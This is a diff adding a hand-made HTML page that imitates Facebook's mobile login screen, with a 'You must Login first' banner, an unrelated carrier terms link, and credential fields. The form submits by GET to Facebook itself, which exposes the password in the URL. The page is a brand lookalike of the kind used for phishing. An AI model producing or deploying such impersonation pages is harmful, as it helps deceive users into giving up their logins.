@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook - login or Sign up</title>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<meta http equiv="x-ua-compatible" content="IE=edge"/>
+<meta charset="UTF-8"/>
+</head>
+<body style="font-family: Arial">
+<style>
+.div {
+background: lightblue;
+border: 1px solid blue;
+border-top-style: none;
+border-left-style: none;
+border-right-style:none;
+padding:4px;
+opacity:0.7;
+height: 50px;
+width:auto;
+text-align:left;
+font-size:13px;
+border-width: 2px;
+border-bottom-style: 1px solid blue;
+margin:0;
+font-size:Arial;
+}
+@media screen and (min-width: 400px) {
+}
+a {
+text-decoration: none;
+}
+a:visited {
+color:blue;
+}
+.div2 {
+background: yellow;
+opacity:0.3;
+width: auto;
+height: 17px;
+font-size:14px;
+border: 1px solid orange;
+border-top-style:none;
+border-left-style:none;
+border-right-style:none;
+border-bottom-style:yellow;
+border-width:2px;
+color: black;
+text-align:left;
+margin:0;
+padding:4px;
+font-weight:bold;
+}
+.sd-block-title {
+font-family: Arial;
+font-size:25px;
+text-align: center;
+color:blue;
+font-weight:bold;
+opacity:0.9;
+margin:5px;
+}
+</style>
+    <div class="div">
+      <div>By proceeding, you agree to <a href="https://mymtn.ng.com">FREEDOM's terms</a>, which include letting Facebook request and receive your phone number. <a href="#">Change Settings</a>
+       </div>
+    </div>
+             <div class="div2">
+                 <div><b>You must Login first.</b></div>
+             </div>
+     <div class="sd-block-title">facebook</div>
+<style>
+input {
+background: lightgrey;
+border: groove;
+border-radius:5px;
+padding: 4px;
+text-indent:7%;
+color:black;
+outline: none;
+width: 290px;
+height:30px;
+opacity:0.4;
+}
+input:hover {
+width: 295px;
+transitio:2s;
+}
+input::placeholder {
+color: black;
+text-indent:7%;
+font-weight:bold;
+}
+input:focus {
+background:lightblue;
+}
+.input {
+background: lightgrey;
+border: groove;
+border-radius:5px;
+padding: 4px;
+text-indent:7%;
+color:black;
+outline: none;
+width: 290px;
+height:30px;
+font-weight:bold;
+opacity:0.4;
+}
+.input::placeholder {
+color: black;
+font-weight:bold;
+text-indent:7%;
+}
+.input:focus {
+background: lightblue;
+}
+</style>
+<center>
+<form action="https://m.facebook.com/Signup/" method="get" onsubmit="return validateForm()"/>
+     <input type="Name" placeholder="Mobile number or email address" name="Mobile number or email address" id="ac"/>
+<br>
+     <input type="Password" class="input" name="passWord" placeholder="Password" required/>
+<script>
+   function validateForm() {
+       var Name = document.getElementById("ac").value;
+       if(Name == "") {
+         alert("Please fill in your Mobile number or email address to continue!!");
+         return false;
+       }
+   }
+</script>
+<style>
+#submit {
+background:blue;
+border:none;
+border-radius:5px;
+padding:4px;
+text-align:center;
+color:#fff;
+font-weight:bold;
+font-size:17px;
+width: 290px;
+height: 40px;
+margin:5px;
+opacity: 0.8;
+}
+#submit:hover {
+box-shadow: 1px 2px 1px 2px lightblue;
+transition:1s;
+}
+</style>
+<br>
+    <input type="submit" id="submit" value="Log in" name="form"/>
+</form>
+</center>
+<p style="color: lightgrey; text-indent: 1%">___________________<b style="color: black"> or </b>_________________</p>
+<style>
+#btn {
+background: green;
+border: none;
+border-radius:4px;
+padding:5px;
+margin:0;
+color:#fff;
+font-weight:bold;
+text-align: center;
+font-size:15px;
+width:auto;
+height: 40px;
+}
+#a2 {
+color:#fff;
+text-decoration:none;
+}
+#a2:visited {
+color:#fff;
+}
+</style>
+    <center><button id="btn"><a href="https://m.facebook.com" id="a2">Create New Account</a></button></center>
+<script>
+        var btn = document.getElementById("btn");
+         btn.addEventListener("click", function() {
+             alert("Your page has loaded!!");
+         });
+</script>
+&nbsp<center><a href="https://facebook.com/passwordreset/" style="font-size: 13px">Forgotten password?</a></center>
+<br>
+<br>
+<br>
+<style>
+footer {
+background: none;
+width:auto;
+text-align: center;
+height:auto;
+font-size:14px;
+color:lightgrey;
+text-indent: 2%;
+}
+#a3 {
+color: lightgrey;
+text-decoration:none;
+}
+#a3:visited {
+color: lightgrey;
+}
+#a3:active {
+color:lightgrey;
+}
+</style>
+   <footer><b><a href="#" id="a3">English (UK)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp</a><a href="#" id="a3">Hausa</a></b></footer>
+   <footer><b><a href="#" id="a3">Français &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp</a><a href="#" id="a3"> شثشوخر </a></b></footer>
+   <footer><b><a href="#" id="a3">Português (Brasil) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp</a><a href="#" id="a3">Espanol</a></b></footer>
+   <footer><b><a href="#" id="a3">Deutsch &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp</a><a href="#" id="a3">➕</a></b></footer>
+<style>
+p {
+color:black;
+font-size:10px;
+text-align:center;
+}
+pre {
+font-size:10px;
+text-align:center;
+}
+#a4 {
+color:black;
+text-decoration:none;
+}
+#a4:visited {
+color:black;
+}
+</style>
+    <p><pre><a href="#" id="a4">About</a> . <a href="#" id="a4">Help</a> . <a href="#" id="a4">More</a></pre></p>
+<p style="font-size: 14px">Facebook Inc.</p>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
